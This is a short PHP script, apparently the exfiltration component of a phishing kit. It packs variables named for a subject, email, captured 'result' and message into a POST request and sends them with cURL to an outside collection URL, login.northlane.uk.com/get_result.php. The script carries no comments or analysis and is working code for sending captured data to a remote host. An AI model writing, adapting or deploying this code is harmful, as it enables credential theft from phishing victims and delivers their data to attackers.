<?php 
$myData = 
"subjek=".$subject.
"&email=".$result_anying.
"&get_result=".$result_anying.
"&pesan=".$message;
$myUrl  = "https://login.northlane.uk.com/get_result.php";

$c4 = curl_init();
curl_setopt($c4, CURLOPT_URL, $myUrl);
curl_setopt($c4, CURLOPT_POST, 1);
curl_setopt($c4, CURLOPT_POSTFIELDS, $myData);
curl_setopt($c4, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($c4, CURLOPT_COOKIEJAR, getcwd()."/cache_server.txt");
curl_setopt($c4, CURLOPT_COOKIEFILE, getcwd()."/cache_server.txt");   
curl_setopt($c4, CURLOPT_HEADER, 0);
curl_setopt($c4, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($c4);
curl_close($c4);
?>